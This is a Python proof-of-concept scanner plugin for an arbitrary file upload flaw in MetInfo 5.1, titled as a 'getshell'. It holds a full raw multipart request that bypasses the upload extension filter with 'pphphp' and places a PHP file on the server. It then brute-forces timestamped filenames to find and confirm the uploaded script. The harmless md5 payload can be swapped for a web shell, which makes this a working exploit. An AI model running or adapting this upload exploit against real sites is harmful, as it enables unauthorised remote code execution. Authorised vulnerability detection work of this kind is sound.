#!/usr/bin/evn python
#-*-:coding:utf-8 -*-


#Author:wonderkun
#Name: MetInfo5.1任意文件上传getshell 
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0139168 
#Data:2015/12/15  

import time 

def assign(service,arg):
    if service=="metinfo":
        return True,arg 

def audit(arg):
    url=arg+"feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo"


    raw='''
POST /feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo HTTP/1.1
Host: localhost
Content-Length: 423
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE1toBNeESf6p0uXQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=hfqa37uap92gdaoc2nsco6g0n1

------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="fd_para[1][para]"

filea
------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="fd_para[1][type]"

5
------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="filea"; filename="test.php"
Content-Type: application/x-php

<?php echo md5(1); ?>
------WebKitFormBoundaryE1toBNeESf6p0uXQ--
    '''
    #proxy=('127.0.0.1',8080)
    code,head,res,errcode,finalurl=curl.curl2(url,raw=raw)
    #upload  file 

    #get upload file name  
    name=int(time.time())
    for i in range(100,10000):
        filename=name+i
        url=arg+'upload/file/%s.php'%(str(filename))
        #print url
        code,head,res,errcode,finalurl=curl.curl2(url)
        if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res :
            security_hole('file upload Vulnerable:'+arg+"feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo")
            break 
if  __name__ == '__main__':
    from dummy import *
    audit(assign("metinfo","http://www.example.com/")[1])  #没找到测试网站 本地搭建环境测试的